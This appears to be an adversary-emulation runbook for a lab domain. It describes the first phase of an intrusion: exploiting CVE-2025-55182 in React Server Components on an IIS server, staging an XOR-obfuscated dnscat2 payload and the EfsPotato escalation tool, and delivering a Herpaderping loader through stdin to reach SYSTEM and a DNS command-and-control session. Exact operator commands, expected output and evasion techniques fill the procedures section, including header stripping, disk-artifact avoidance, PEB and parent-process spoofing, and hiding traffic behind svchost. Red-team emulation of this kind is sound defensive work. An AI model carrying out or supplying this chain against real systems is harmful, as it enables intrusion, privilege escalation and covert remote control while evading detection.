# Phase 1 - Initial Access & Command and Control

## Overview
The attacker targets an internal IIS server hosting `react.testlab.local`. A React Server Components deserialization vulnerability (CVE-2025-55182) is exploited to achieve unauthenticated RCE on the IIS server as `IIS APPPOOL\react.testlab.local`. From this foothold, the react2shell staging channel delivers two disk-resident artifacts — the EfsPotato escalation tool and an XOR-encoded dnscat2 DnsQuery_W payload (`cmd/dnscat-dnsapi`) — then delivers the CWLHerpaderping loader via stdin pipe into the EfsPotato process, escalating to `NT AUTHORITY\SYSTEM` and establishing a DNS C2 session as a ghost `RuntimeBroker.exe` process.

## Step 1 — Initial Access, Privilege Escalation & C2 Establishment

### Voice Track

The attacker exploits `react.testlab.local` — a Next.js application running under `iisnode` on the IIS server. A crafted React Server Components multipart request reaches the vulnerable deserialization path and executes JavaScript inside the Node.js worker as `IIS APPPOOL\react.testlab.local`.

With the web RCE shell live, two artifacts are staged to disk via the react2shell in-memory base64 stream. The dnscat2 payload is staged with `--encrypt`: position-dependent XOR (`out[i] = in[i] ^ ((0xA3 + i*0x5B) & 0xFF)`) is applied in Python memory before encoding, writing `C:\ProgramData\CertCA.enc` — the on-disk file carries no valid MZ header (first byte `0xEE` instead of `0x4D`), defeating file-hash and byte-signature detections (T1027.013). The EfsPotato escalation tool is staged without encryption to `C:\Windows\Temp\CertEnrollSvc.exe`. Neither staging operation writes a `.b64` intermediate to disk at any point.

The CWLHerpaderping loader is never written to disk as a named file. The `pipestage` command streams the raw loader PE from the attacker's local disk into `global.__stageBuffer` on the target Node.js process, then issues a single `spawnSync` that pipes the decoded PE bytes (prefixed with a 4-byte LE size header) directly into `CertEnrollSvc.exe`'s stdin. `CertEnrollSvc.exe` reads the loader from the stdin pipe, exploits `SeImpersonatePrivilege` via named-pipe impersonation to obtain an `NT AUTHORITY\SYSTEM` token, and executes the loader as SYSTEM.

CWLHerpaderping (running as SYSTEM) reads `CertCA.enc` from disk, XOR-decodes the dnscat2 PE entirely in-memory, then deletes `CertCA.enc` to remove the on-disk artifact (T1070.004). The Herpaderping flow follows: dnscat2 PE is written into a temporary section-backed image (`HD*.tmp`), a ghost process is created with image path `C:\Windows\System32\RuntimeBroker.exe` and PPID spoofed to a Session 0 `svchost.exe` or `wininit.exe`, the temp file is overwritten to break post-creation scanning, and the ghost process PEB is rewritten to spoof both the image path and command-line arguments. A DNS C2 session is established from the IIS host as `NT AUTHORITY\SYSTEM`. The dnscat2 payload is the DnsQuery_W transport variant (`cmd/dnscat-dnsapi`): all DNS queries route through `dnsapi.dll!DnsQuery_W`, so the UDP/53 socket is held by `svchost.exe` running the Dnscache service rather than by the ghost process — at the network layer, tunnel traffic appears to originate from a trusted Windows system service. Sysmon Event 22 still logs `RuntimeBroker.exe` as the querying process via its PID, but NDR tools and firewall socket-attribution rules see `svchost.exe`. The attacker issues a `shell` command to spawn `cmd.exe` under the ghost process; all subsequent commands in Phases 2–5 execute within this child shell.

### Procedures

- ☣️ Stage dnscat2 DnsQuery_W payload with XOR encryption (T1027.013) — `svcmgr.exe` is the operational build of `cmd/dnscat-dnsapi` (see `resources/payloads/rce-and-c2/dnscat2/go-client/BUILD.md`); no `.b64` disk artifact; first byte on disk `0xEE` (not `0x4D`), no valid MZ header

  ```
  stage --encrypt ../../rce-and-c2/dnscat2/go-client/svcmgr.exe C:\ProgramData\CertCA.enc
  ```

  - ***Expected Output***

    ```text
    [*] XOR encoded payload before staging (T1027.013)
    [*] Staging .../svcmgr.exe (...) -> C:\ProgramData\CertCA.enc in N chunks (NO .b64 disk artifact)...
    [*] Progress: N/N chunks
    [+] File staged successfully -> C:\ProgramData\CertCA.enc (... bytes, NO .b64 disk artifact!)
    ```

- ☣️ Stage `CertEnrollSvc.exe` (EfsPotato escalation tool) — encode + stream + decode in one step, no `.b64` disk artifact; then rename to `.exe`

  ```
  stage ../../priv-escalation/EfsPotato/CertEnrollSvc.exe C:\Windows\Temp\CertEnrollSvc.bin
  rename C:\Windows\Temp\CertEnrollSvc.bin C:\Windows\Temp\CertEnrollSvc.exe
  ```

  - ***Expected Output***

    ```text
    [*] Staging .../CertEnrollSvc.exe (...) -> C:\Windows\Temp\CertEnrollSvc.bin in N chunks (NO .b64 disk artifact)...
    [*] Progress: N/N chunks
    [+] File staged successfully -> C:\Windows\Temp\CertEnrollSvc.bin (... bytes, NO .b64 disk artifact!)
    [*] Renaming C:\Windows\Temp\CertEnrollSvc.bin -> C:\Windows\Temp\CertEnrollSvc.exe via eval (NO spawn - STEALTH!)...
    [+] File renamed successfully -> C:\Windows\Temp\CertEnrollSvc.exe (NO process spawn!)
    ```

- ☣️ Deliver CWLHerpaderping loader via stdin pipe into `CertEnrollSvc.exe` — triggers EfsPotato SYSTEM escalation and Herpaderping chain; loader PE never written to disk as a named artifact

  ```
  pipestage ../../process-injection/CWLHerpaderping/x64/Release/CWLHerpaderping.exe C:\Windows\Temp\CertEnrollSvc.exe
  ```

  - ***Expected Output***

    ```text
    [*] Pipestage: streaming .../../process-injection/CWLHerpaderping.exe (...) -> C:\Windows\Temp\CertEnrollSvc.exe stdin in N chunks (NO disk artifact)...
    [*] Progress: N/N chunks
    [+] PE delivered via pipestage stdin (NO disk artifact!)
    [*] Detection: node.exe spawns C:\Windows\Temp\CertEnrollSvc.exe with stdin pipe (... bytes)
    ```

- ☣️ Switch to the attacker machine and confirm the SYSTEM C2 session

  ```text
  dnscat2> New session established: <session-id-1>
  dnscat2> session -i <session-id-1>
  command (iis-server) 1> whoami
  ```

  - ***Expected Output***

    ```text
    nt authority\system
    ```

- ☣️ Open an interactive `cmd.exe` shell from the SYSTEM dnscat2 session

  ```text
  command (iis-server) 1> shell
  ```

  - ***Expected Output***

    ```text
    New session created: <session-id-2>
    ```

  ```text
  dnscat2> session -i <session-id-2>
  sh (iis-server) 2>
  ```

  > **Note:** `shell` spawns `cmd.exe` as a child of the `RuntimeBroker.exe` ghost process under `NT AUTHORITY\SYSTEM`. All subsequent commands in Phases 2–5 that run from the IIS01 SYSTEM session execute within this `cmd.exe` child.
